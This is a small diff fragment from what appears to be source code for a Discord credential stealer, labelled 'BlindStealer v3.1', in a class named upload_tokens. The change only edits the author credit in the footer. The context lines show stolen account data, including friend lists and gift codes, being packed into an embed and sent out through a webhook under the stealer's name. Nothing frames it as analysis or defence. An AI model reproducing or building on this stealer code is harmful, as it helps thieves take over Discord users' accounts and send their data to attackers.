@@ -357,6 +357,6 @@ class upload_tokens:
                 embed.add_field(name="", value=hq_friends, inline=False)
             if codes != None:
                 embed.add_field(name="🎁 Gift Codes", value=codes, inline=False)
-            embed.set_footer(text="Blind v3.1 · Created by: readdone#9772")
+            embed.set_footer(text="Blind v3.1 · Created by: readdone#1155")
 
             self.webhook.send(embed=embed, username="BlindStealer - v3.1", avatar_url="https://i.imgur.com/LNVOaxg.png")
